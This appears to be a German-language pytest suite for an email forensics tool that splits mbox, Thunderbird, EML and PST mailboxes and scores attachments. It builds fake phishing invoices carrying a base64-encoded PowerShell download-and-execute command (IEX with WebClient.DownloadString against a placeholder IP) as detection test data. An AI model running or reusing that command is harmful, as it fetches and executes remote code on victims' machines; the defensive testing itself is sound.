"""Postfach-Scan: mbox/Thunderbird/EML zerlegen, PST-Umwandlung, Batch-Fluss in eigenen Fall."""
import base64
import mailbox
import os
from email.message import EmailMessage

import pytest

from engines import mailbox_split as ms
from engines import run_forensic

ENC = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')".encode("utf-16-le")).decode()


def _mail(subject, sender, body, attach=None):
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = sender, "opfer@firma.invalid", subject
    m["Date"] = "Tue, 01 Oct 2024 10:00:00 +0000"
    m.set_content(body)
    if attach:
        m.add_attachment(attach[1], maintype="application", subtype="octet-stream", filename=attach[0])
    return m


def _mbox(path, mails):
    box = mailbox.mbox(str(path))
    for m in mails:
        box.add(m)
    box.flush()
    box.close()
    return path


def _campaign():
    return [_mail("Rechnung 0412", "billing@pay-portal.invalid", "Bitte zahlen: https://pay-portal.invalid/p",
                  ("Rechnung.ps1", f"powershell -EncodedCommand {ENC}".encode())),
            _mail("Mahnung", "billing@pay-portal.invalid", "Letzte Mahnung https://pay-portal.invalid/m"),
            _mail("Kantine", "hr@firma.invalid", "Heute gibt es Suppe.")]


def test_split_mbox_and_thunderbird_profile(tmp_path):
    prof = tmp_path / "profile" / "Mail" / "Local Folders"
    prof.mkdir(parents=True)
    _mbox(prof / "Inbox", _campaign())
    (prof / "Inbox.msf").write_text("// index")
    (prof / "extra.eml").write_bytes(bytes(_mail("Einzeln", "a@b.invalid", "hallo")))
    assert {k for k, _ in ms.sources(tmp_path / "profile")} == {"mbox", "eml"}
    res = ms.split(str(tmp_path / "profile"), tmp_path / "out")
    subjects = [m["subject"] for m in res["messages"]]
    assert set(subjects) == {"Rechnung 0412", "Mahnung", "Kantine", "Einzeln"} and not res["errors"]
    files = sorted(os.listdir(tmp_path / "out"))
    assert len(files) == 4 and all(f.endswith(".eml") for f in files)


def test_limit(tmp_path, monkeypatch):
    monkeypatch.setattr(ms, "MAX_MESSAGES", 2)
    p = _mbox(tmp_path / "box.mbox", _campaign())
    res = ms.split(str(p), tmp_path / "o")
    assert len(res["messages"]) == 2 and res["truncated"]


class _FakeAttachment:
    def __init__(self, name, data):
        self.name, self._d = name, data

    def get_size(self):
        return len(self._d)

    def read_buffer(self, n):
        return self._d[:n]


class _FakePstMessage:
    transport_headers = ("From: Buchhaltung <billing@pay-portal.invalid>\r\nTo: opfer@firma.invalid\r\n"
                         "Subject: Rechnung\r\nDate: Tue, 01 Oct 2024 10:00:00 +0000\r\n"
                         "Content-Type: multipart/mixed; boundary=x")
    subject = "Rechnung"
    plain_text_body = b"Anbei die Rechnung."
    html_body = b"<p>Anbei</p>"
    number_of_attachments = 1

    def get_attachment(self, i):
        return _FakeAttachment("Rechnung.ps1", f"powershell -EncodedCommand {ENC}".encode())


def test_pst_message_conversion_feeds_the_payload_chain(tmp_path):
    raw = ms.pst_message_to_eml(_FakePstMessage())
    p = tmp_path / "m.eml"
    p.write_bytes(raw)
    res = run_forensic(str(p))
    names = [n["name"] for n in res["payloads"]]
    assert "Rechnung.ps1" in names and res["score"]["level"] == "CRITICAL"
    assert "billing@pay-portal.invalid" in raw.decode("utf-8", "replace")


def test_missing_pst_support_is_reported(tmp_path, monkeypatch):
    import builtins
    real = builtins.__import__

    def fake(name, *a, **k):
        if name == "pypff":
            raise ImportError("no pypff", name="pypff")
        return real(name, *a, **k)
    monkeypatch.setattr(builtins, "__import__", fake)
    p = tmp_path / "outlook.pst"
    p.write_bytes(b"!BDN" + b"\0" * 100)
    res = ms.split(str(p), tmp_path / "o")
    assert res["messages"] == [] and "pip install libpff-python" in res["errors"][0]


def test_mailbox_scan_into_case(tmp_path):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    from core.history import HistoryDB
    from core.iocgraph import graph_from_db
    from core.sandbox import mailbox_isolated
    from gui.history_view import HistoryView
    from gui.batch_view import BatchView
    db = HistoryDB(tmp_path / "h.db")
    view = BatchView(analyze_fn=run_forensic, history=HistoryView(db=db))
    box = _mbox(tmp_path / "Posteingang.mbox", _campaign())
    res, folder = mailbox_isolated(box, tmp_path / "probe")          # unter Windows: echter Sandbox-Worker
    assert len(res["messages"]) == 3 and folder, res.get("errors")
    view.scan_mailbox(str(box), run_async=False,
                      split_fn=lambda p, dest: mailbox_isolated(p, tmp_path / "mailboxes"))
    app.processEvents()
    view._runner.wait(60)
    app.processEvents()
    assert view.table.rowCount() == 3
    case = db.list_cases()[0]
    assert case["name"].startswith("Mailbox · Posteingang.mbox") and case["analyses"] == 3
    assert view.table.item(0, 3).text() == "CRITICAL"                       # Mail mit Skript-Anhang oben
    g = graph_from_db(db, case_id=case["id"])
    assert "domain:pay-portal.invalid" in {i["key"] for i in g["iocs"]}
    assert any((tmp_path / "mailboxes").iterdir())                        # Mails bleiben erhalten
